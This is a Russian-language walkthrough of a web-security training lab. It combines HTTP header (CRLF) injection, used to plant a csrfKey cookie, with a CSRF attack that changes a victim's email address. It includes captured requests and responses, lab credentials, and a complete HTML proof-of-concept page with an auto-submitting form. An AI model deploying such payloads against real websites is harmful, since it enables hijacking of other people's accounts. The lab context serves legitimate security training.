Функция изменения электронной почты этой лаборатории уязвима для CSRF. Он использует токены, чтобы попытаться предотвратить атаки CSRF, но они не полностью интегрированы в систему обработки сеансов сайта.

## Дано

Учётки
- `wiener:peter`
- `carlos:montoya`

## Задача

Создать HTML-страницу, которая использует атаку CSRF для изменения адреса электронной почты зрителя

# Разведка

При смене почты видим csrfkey к cookie и csrf при смене пароля
```
Cookie: session=91Fl3EVdjX0ph2pnDhZRYyfrFUlufd1U; csrfKey=0wKQuTO16vGecEKawfnScGxJheVIbkt0

csrf=jc6wuOoITzV5Rwb6oBeYq2Mu8Lbat6xr
```

Методика тестирования csrf токенов
- Проверить связаны ли токены между собой (СВЯЗАНЫ)
- Проверить подмену csrf токенов с другой учётки (СВЯЗАН)
	Другая учётка csrf FvwBytwcoVfzbJRfVertWJxpE8fVc2QI
- - Проверить связан ли токен csrfkey c csrf без cookie чужой учётки 
	csrfkey CaCIBwEBIOn7R5mb78ES4Sz9BcBoKjGQ **(БИНГО)**

- csrfkey и csrf связаны между собой но не с cookie тем самым поимев их мы можем сменить данные почты

СИСТЕМА ОБРАБОТКИ СЕАНСОВ И МЕХАНИЗМЫ ЗАЩИТЫ НЕ СВЯЗАНЫ
# Атака

- Для атаки нам нужно внедрить в http cookie (csrfkey) и наш cookie сессию
- Затем провести атаку на csrf токен для изменения почты (его получить можно ток при нажатие изменить почту)

Задача заключается объединить атаку на csrfkey с csrf 
1. Найти уязвимость внедрения http заголовка (уязвимость возникает когда страница генерируется динамически)

```
GET /?search=home HTTP/2
Host: 0adf00d6042b40ce800935d7000e008f.web-security-academy.net
Cookie: session=lX3R7Etm8yfs3pDsVWZOHt9jCsRHfEh2; csrfKey=qJ4Oejb7Bm7U9DizmjsO5j8jUqvpxLdq; LastSearchTerm=??????
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://0adf00d6042b40ce800935d7000e008f.web-security-academy.net/?search=%D0%B4%D0%BE%D0%BC
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-Gpc: 1
Priority: u=0, i
Te: trailers
```
При поиске запрос есть ответ
```
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=home; Secure; HttpOnly
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 6073
```
Set-Cookie: LastSearchTerm=home; - уязвима

Формируем запрос
```
GET /?search=home%0d%0aSet-Cookie:%20csrfKey=ZWo4s3kDZOkgCaWgYDjgh2SB3XnrpWOL HTTP/2
```
Получаем ответ
```
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=home
Set-Cookie: csrfKey=ZWo4s3kDZOkgCaWgYDjgh2SB3XnrpWOL; Secure; HttpOnly
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3474
```


## Формируем атаку
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0adf00d6042b40ce800935d7000e008f.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test100&#64;mail&#46;ru" />
      <input type="hidden" name="csrf" value="FvwBytwcoVfzbJRfVertWJxpE8fVc2QI" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0adf00d6042b40ce800935d7000e008f.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=CaCIBwEBIOn7R5mb78ES4Sz9BcBoKjGQ%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```
Здесь мы вставили свой csrf ключ к изменению почты а так же изображение которое изменяет csrkey токен на наш после чего сервер считает новый токен жертвы и обрабатывается ошибка по условию картинки и мы получаем данные для входа cookie csrf 